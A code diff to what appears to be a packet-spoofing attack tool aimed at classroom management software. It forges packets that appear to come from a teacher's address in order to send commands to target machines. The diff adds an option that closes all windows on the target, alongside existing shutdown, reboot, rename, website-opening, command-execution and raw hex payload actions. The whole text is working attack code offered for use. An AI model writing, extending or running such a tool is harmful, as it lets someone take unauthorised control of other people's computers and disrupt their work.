@@ -15,7 +15,7 @@ import binascii
 from typing import Any, Sequence, cast
 
 from sender import broadcast_packet
-from packet import pkg_message, pkg_shutdown, pkg_rename, pkg_website, pkg_execute
+from packet import pkg_close_windows, pkg_message, pkg_shutdown, pkg_rename, pkg_website, pkg_execute
 
 
 class ModeOptionalAction(argparse.Action):
@@ -167,6 +167,14 @@ if __name__ == "__main__":
         help="Reboot the target machine, optionally with a timeout and message",
     )
     attack_action.add_argument(
+        "-cw",
+        "--close-windows",
+        nargs="*",
+        default=None,
+        metavar=("<timeout>", "<message>"),
+        help="Close all windows on the target machine",
+    )
+    attack_action.add_argument(
         "-n",
         "--rename",
         nargs=2,
@@ -222,13 +230,23 @@ if __name__ == "__main__":
                     payload = pkg_shutdown(timeout=int(timeout), message=message, reboot=True)
                 case _:
                     parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
+        elif args.close_windows is not None:
+            match args.close_windows:
+                case []:
+                    payload = pkg_close_windows()
+                case [timeout]:
+                    payload = pkg_close_windows(timeout=int(timeout))
+                case [timeout, message]:
+                    payload = pkg_close_windows(timeout=int(timeout), message=message)
+                case _:
+                    parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
         elif args.rename:
             name, name_id = args.rename
             payload = pkg_rename(name, int(name_id))
         elif args.hex:
             payload = binascii.unhexlify(args.hex.replace(" ", ""))
         else:
-            raise ValueError("Either message or website must be provided")
+            raise ValueError("Program logic error, please report this issue: No valid action specified.")
 
         broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
         print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
